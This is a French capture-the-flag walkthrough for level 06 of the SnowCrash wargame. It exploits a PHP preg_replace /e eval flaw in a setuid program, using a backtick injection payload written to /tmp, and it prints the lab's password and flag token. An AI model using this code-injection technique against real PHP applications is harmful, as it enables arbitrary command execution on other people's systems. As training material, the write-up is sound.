# LEVEL 06

### Reconnaissance

Lorsqu'on se connecte au level06, avec le password viuaaale9huek52boumoomioc
On a 2 fichiers:
```
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

- un binaire (level06)
- un fichier php (level06.php)

### Exploitation

En analysant le fichier php on peux voir une vulnérabilitée:

```
PREG_REPLACE_EVAL : /e --> [...]$a = preg_replace("/(\[x (.*)\])/e"[...]
```

Il nous suffit donc d'inséré un code qui poura etre évaluer:

```
level06@SnowCrash:~$ vim /tmp/exploit
// entrer ce code
[x ${`$z`}]
```

- Explication
```
[x        ]	--> code a remplacer sur le preg_replace
${}	    	--> https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex
``	        --> revient a faire un shell_exec() mais avec l'avantage ici de ne pas devoir inseré de quote ni de parenthèse.
```
Plus d'infos: https://stackoverflow.com/questions/3115559/exploitable-php-functions

```
level06@SnowCrash:~$ ./level06 /tmp/exploit getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Et voila :)
